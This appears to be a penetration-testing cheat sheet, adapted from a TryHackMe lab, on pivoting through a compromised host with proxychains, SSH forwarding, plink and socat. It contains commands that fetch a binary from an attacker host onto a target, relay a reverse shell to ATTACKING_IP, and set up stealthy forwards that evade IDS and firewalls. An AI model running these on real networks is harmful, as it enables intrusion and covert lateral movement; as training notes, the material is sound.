---
description: >-
  A cheat sheet for the tools used to tunnel, pivot and proxy. Shout out to
  tryhackme.com as these notes are largely taken from:
  https://tryhackme.com/room/wreath
---

# Tunnelling, Pivoting and Proxies

**These notes are still under Dev.**

## **Proxy/Forwarding**

There are two main methods encompassed in this area of pen testing:

* **Tunnelling/Proxying:** Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be tunnelled inside another protocol \(e.g. SSH tunnelling\), which can be useful for evading a basic **I**ntrusion **D**etection **S**ystem \(IDS\) or firewall 
* **Port Forwarding:** Creating a connection between a local port and a single port on a target, via a compromised host

### **Tools**

* Proxychains / FoxyProxy
* SSH port forwarding and tunnelling \(primarily Unix\)
* Plink.exe \(Windows\)
* Socat \(Windows and Unix\)
* Chisel \(Windows and Unix\)
* Sshuttle \(currently Unix only\)

## **ProxyChains**

 Proxychains is a command line tool which is activated by prepending the command `proxychains` to other commands. For example, to proxy netcat  through a proxy, you could use the command:

```text
proxychains nc 172.16.0.10 23
```

{% hint style="info" %}
 proxychains reads its options from a config file. The master config file is located at `/etc/proxychains.conf`
{% endhint %}

Proxychains will look by default in the following locations \(in order\):

1. The current directory \(i.e. `./proxychains.conf`\)
2. `~/.proxychains/proxychains.conf`
3. `/etc/proxychains.conf`

 When we edit proxychains we are interested in the "ProxyList" section:

```text
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

It is here that we can choose which port\(s\) to forward the connection through.

If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the `proxy_dns` line using a hashtag \(`#`\) at the start of the line before performing a scan through the proxy!  
![ Proxy\_DNS line commented out with a hashtag](https://assets.tryhackme.com/additional/wreath-network/557437aec525.png)

Other things to note when scanning through proxychains:

* You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packest \(Ping requests\) will also not work through the proxy, so use the  `-Pn`  switch to prevent Nmap from trying it.
* It will be extremely slow. Try to only use Nmap through a proxy when using the NSE \(i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library\).

## Port Forwarding/Tunnelling \(SSH\)

There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

### Local port Forward

Port forwarding is accomplished with the `-L` switch, which creates a link to a Local port. For example, if we had SSH access to 192.16.0.2 and there's a webserver running on port 80 on the IP 192.16.0.10, We could create a local connection to our own IP's port 8000:

```text
ssh -L 8000:192.16.0.10:80 user@192.16.0.2 -fN
```

  The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.

{% hint style="info" %}
It is good practice to use high ports, as we would need to use `sudo` to create a connection on any port below 1025
{% endhint %}

### Proxy

Proxies are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains:

```text
ssh -D 1337 user@172.16.0.10 -fN
```

### Reverse Connections

1.   First, generate a new set of SSH keys and store them somewhere safe `ssh-keygen`
2. Copy the contents of the public key \(the file ending with `.pub`\), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first.
3. On a new line, type the following line, then paste in the public key: `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`

This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

{% hint style="warning" %}
Make sure SSH is running `sudo systemctl start ssh`
{% endhint %}

Transfer the private key to the target box! \(mad man\).

We can then connect back with a reverse port forward using the following command:

```text
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
```

 In newer versions of the SSH client, it is also possible to create a reverse proxy \(the equivalent of the `-D` switch used in local connections\). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:

```text
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```

{% hint style="info" %}
Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from.
{% endhint %}

To close any of these connections, type `ps aux | grep ssh` into the terminal of the machine that created the connection: Finally, type `sudo kill PID` to close the connection:

## Plink.exe

Plink.exe is a Windows command line version of the PuTTY SSH client. download a new copy from [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

### Reverse Connection

```text
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
```

{% hint style="info" %}
 Note that any keys generated by `ssh-keygen` will not work properly here. You will need to convert them using the `puttygen` tool, which can be installed on Kali using `sudo apt install putty-tools`. After downloading the tool, conversion can be done with:  
`puttygen KEYFILE -o OUTPUT_KEY.ppk`
{% endhint %}

 The resulting `.ppk` file can then be transferred to the Windows target

## Socat

It's best to think of socat as a way to join two things together. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things.

### Upload Socat

```text
#on attacker
sudo python3 -m http.server 80

#on target
curl ATTACKING_IP/socat -o /tmp/socat && chmod +x /tmp/socat
```

> **Line 2**: Start a web server on our kali machine
>
> **Line 5:** Curl Socat onto the attacking box, **O**utput it as /tmp/socat and add the e**x**ecutable bit.

### **Reverse Shell Relay**

Using socat we can create a relay for us to send a reverse shell back to our own attacking machine.

```text
#on attacker
sudo nc -lvnp 443

#on target
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
```

> **Line 2:** Start a netcat listener on port 443.
>
> **Line 5:** Using socat, relay port 443 to our local machine on port 8000.
>
> **&:** Backgrounds the application.

{% hint style="info" %}
Make sure to open the listening port first, then connect back to the attacking machine.
{% endhint %}

###  **Port Forwarding**

Open up a listening port on the compromised server, and redirect whatever comes into it to the target server. 

```text
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```

> **./socat:** Run Socat.
>
> **tcp-l:33060:** start a listening port on 33060 on our local machine.
>
> **Fork:** put every connection into a new process.
>
> **reuseaddr:** keeps the port open after a connection is made.
>
> **&:** Backgrounds the application.

### **Port Forwarding - Stealth**

We can also port forward, but without opening any ports on the server!

First of all, on our own attacking machine, we issue the following command:

```text
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

Next, on the compromised relay server we execute this command:

```text
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

 This would create a link between port 8000 on our attacking machine, and port 80 on the intended target , meaning that we could go to `localhost:8000` in our attacking machine's web browser to load the webpage served by the target!

This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:

* The request goes to `127.0.0.1:8000`
* Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
* Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.

The process is then reversed when the target sends the response:

* The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
* Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.

### Close Connections

 Run the `jobs` command in your terminal, then kill any socat processes using `kill %NUMBER.`

